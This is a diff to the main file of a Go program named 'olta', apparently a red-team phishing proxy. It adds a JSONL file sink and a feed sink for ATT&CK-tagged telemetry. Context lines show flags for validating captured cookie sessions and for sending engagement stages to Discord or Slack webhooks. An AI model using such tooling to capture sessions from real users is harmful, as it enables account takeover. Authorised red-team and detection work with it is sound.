@@ -26,6 +26,8 @@ import (
 	sqlitedsn "github.com/s4l1hs/olta/pkg/storage/sqlite"
 	"github.com/s4l1hs/olta/pkg/telemetry"
 	"github.com/s4l1hs/olta/pkg/telemetry/sink/campaigndb"
+	feedsink "github.com/s4l1hs/olta/pkg/telemetry/sink/feed"
+	"github.com/s4l1hs/olta/pkg/telemetry/sink/jsonl"
 	"github.com/s4l1hs/olta/pkg/telemetry/sink/webhook"
 	"go.uber.org/zap"
 )
@@ -55,6 +57,7 @@ var enable_js_inspect = flag.Bool("enable-js-inspect", false, "Enable client-sid
 var js_inspect_endpoint = flag.String("js-inspect-endpoint", "/_assets/js/v.js", "Internal route used for client browser verification assertions")
 var enable_session_validator = flag.Bool("enable-session-validator", false, "Asynchronously validate captured cookie sessions")
 var webhook_url = flag.String("webhook-url", "", "Discord, Slack, or generic JSON webhook that receives every engagement telemetry stage")
+var telemetry_file = flag.String("telemetry-file", "", "Append ATT&CK-tagged telemetry events to this JSONL file")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -209,6 +212,17 @@ func main() {
 			return
 		}
 		sinks = append(sinks, webhookSink)
+	}
+	if *feed_enabled {
+		sinks = append(sinks, feedsink.New(*feed_url))
+	}
+	if *telemetry_file != "" {
+		fileSink, err := jsonl.New(*telemetry_file)
+		if err != nil {
+			log.Fatal("open telemetry file: %v", err)
+			return
+		}
+		sinks = append(sinks, fileSink)
 	}
 	telemetryBus := telemetry.NewBus(1024, sinks...)
 	defer func() {
